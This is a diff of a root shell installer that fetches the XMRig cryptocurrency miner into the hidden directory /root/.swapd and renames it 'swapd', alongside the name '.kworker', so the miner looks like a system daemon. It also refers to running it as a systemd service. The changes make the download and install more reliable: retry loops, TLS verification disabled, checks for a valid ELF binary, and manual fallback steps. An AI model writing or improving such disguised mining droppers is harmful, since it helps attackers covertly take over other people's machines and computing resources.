@@ -799,23 +799,42 @@ cd /root/.swapd || {
 
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
 DOWNLOAD_SUCCESS=false
+ATTEMPTS=0
+MAX_ATTEMPTS=3
 
-# Try to download xmrig
-if [ "$USE_WGET" = true ]; then
-    if [ "$VERBOSE" = true ]; then
-        echo "[*] wget --no-check-certificate -O xmrig.tar.gz $XMRIG_URL"
-        wget --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
+# Retry download up to 3 times
+while [ $ATTEMPTS -lt $MAX_ATTEMPTS ] && [ "$DOWNLOAD_SUCCESS" = false ]; do
+    ATTEMPTS=$((ATTEMPTS + 1))
+    echo "[*] Download attempt $ATTEMPTS/$MAX_ATTEMPTS..."
+    
+    # Try to download xmrig
+    if [ "$USE_WGET" = true ]; then
+        if [ "$VERBOSE" = true ]; then
+            echo "[*] wget --no-check-certificate -O xmrig.tar.gz $XMRIG_URL"
+            wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
+        else
+            wget --timeout=30 --tries=2 -q --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
+        fi
     else
-        wget -q --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
+        if [ "$VERBOSE" = true ]; then
+            echo "[*] curl -L -k -o xmrig.tar.gz $XMRIG_URL"
+            curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
+        else
+            curl --max-time 60 --retry 2 -sS -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
+        fi
     fi
-else
-    if [ "$VERBOSE" = true ]; then
-        echo "[*] curl -L -k -o xmrig.tar.gz $XMRIG_URL"
-        curl -L -k -o xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
+    
+    # Verify download
+    if [ -f xmrig.tar.gz ] && [ -s xmrig.tar.gz ]; then
+        echo "[✓] Downloaded $(du -h xmrig.tar.gz | cut -f1)"
+        break
     else
-        curl -sS -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
+        echo "[!] Download failed or file is empty"
+        DOWNLOAD_SUCCESS=false
+        rm -f xmrig.tar.gz
+        sleep 2
     fi
-fi
+done
 
 # Extract if download was successful
 if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
@@ -848,11 +867,27 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
 fi
 
 if [ "$DOWNLOAD_SUCCESS" = false ]; then
-    echo "[!] Failed to download/extract XMRig"
-    echo "[!] You can manually download xmrig and place it at /root/.swapd/.kworker"
-    echo "[*] Continuing with installation anyway..."
-    # Create a placeholder so config creation doesn't fail
-    touch /root/.swapd/.kworker 2>/dev/null || true
+    echo ""
+    echo "=========================================="
+    echo "[!] CRITICAL: XMRIG DOWNLOAD FAILED"
+    echo "=========================================="
+    echo "[!] Failed to download XMRig after $MAX_ATTEMPTS attempts"
+    echo "[!] Cannot continue without miner binary"
+    echo ""
+    echo "Possible issues:"
+    echo "  - GitHub may be blocked in your region"
+    echo "  - Network connectivity issues"
+    echo "  - Firewall blocking outbound connections"
+    echo ""
+    echo "Manual installation:"
+    echo "  1. Download from alternate mirror:"
+    echo "     wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+    echo "  2. Extract: tar -xzf xmrig-6.21.0-linux-x64.tar.gz"
+    echo "  3. Move: mv xmrig-6.21.0/xmrig /root/.swapd/swapd"
+    echo "  4. Make executable: chmod +x /root/.swapd/swapd"
+    echo "  5. Re-run this script"
+    echo ""
+    exit 1
 fi
 
 # ==================== RENAME BINARY TO SWAPD ====================
@@ -878,17 +913,34 @@ elif [ -f xmrig ]; then
         echo "[✓] Binary copied to swapd"
     fi
 else
-    echo "[!] Warning: No miner binary found (.kworker or xmrig missing)"
-    echo "[!] Creating placeholder..."
-    touch swapd && chmod +x swapd
+    echo "[!] CRITICAL ERROR: No miner binary found (.kworker or xmrig missing)"
+    echo "[!] Download/extraction failed - cannot continue with installation"
+    echo ""
+    echo "Manual fix required:"
+    echo "1. Download manually: curl -L -o /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+    echo "2. Extract: tar -xzf /tmp/xmrig.tar.gz -C /tmp/"
+    echo "3. Copy: cp /tmp/xmrig-6.21.0/xmrig /root/.swapd/swapd"
+    echo "4. Make executable: chmod +x /root/.swapd/swapd"
+    echo "5. Restart: systemctl restart swapd"
+    echo ""
+    echo "Exiting..."
+    exit 1
 fi
 
-# Verify swapd exists
-if [ -f swapd ]; then
-    echo "[✓] Miner binary ready as 'swapd'"
-    ls -lh swapd
+# Verify swapd exists and is actually executable (not just an empty file)
+if [ -f swapd ] && [ -s swapd ]; then
+    # Check if it's a valid ELF binary
+    if file swapd | grep -q "ELF.*executable"; then
+        echo "[✓] Miner binary ready as 'swapd'"
+        ls -lh swapd
+    else
+        echo "[!] ERROR: swapd exists but is not a valid executable binary!"
+        file swapd
+        exit 1
+    fi
 else
-    echo "[!] ERROR: swapd binary not created!"
+    echo "[!] ERROR: swapd binary not created or is empty!"
+    exit 1
 fi
 
 
